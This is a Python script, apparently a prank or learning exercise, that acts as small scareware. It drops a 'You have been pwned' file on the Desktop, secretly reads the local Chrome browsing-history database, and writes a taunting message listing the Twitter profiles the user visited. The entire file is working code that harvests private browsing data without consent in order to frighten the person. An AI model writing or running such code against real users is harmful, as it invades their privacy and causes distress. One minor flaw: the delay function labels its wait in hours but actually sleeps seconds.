import os
import re
from time import sleep
from random import randrange
from pathlib import Path
import sqlite3


#home_path = "/home/" + os.getlogin()
home_path = "{}".format(Path.home())
desktop_path = home_path + "/Desktop/"
FILE = desktop_path + "eps3.7dont-delete-me.ko"
history_path = "/home/" + os.getlogin() + "/.config/google-chrome/Default/History"

def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} Segundos...".format(n_hours))
    sleep(n_hours)


def create_hacker_file():
    hacker_file = open(FILE, "w")
    hacker_file.write("You have been pwned\n")
    return hacker_file


def get_chrome_history():
    urls = None
    while not urls:
        try:
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            sleep(3)


def check_history_and_scare_user(hacker_file, chrome_history):
    maxhist = 1
    profiles_visited = []
    url_exceptions = ["home", "notifications", "explore", "login"]

    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in url_exceptions:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))


def main():
    print(FILE)

    delay_action()
    hacker_file = create_hacker_file()
    chrome_history = get_chrome_history()
    check_history_and_scare_user(hacker_file, chrome_history)



if __name__ == "__main__":
    main()
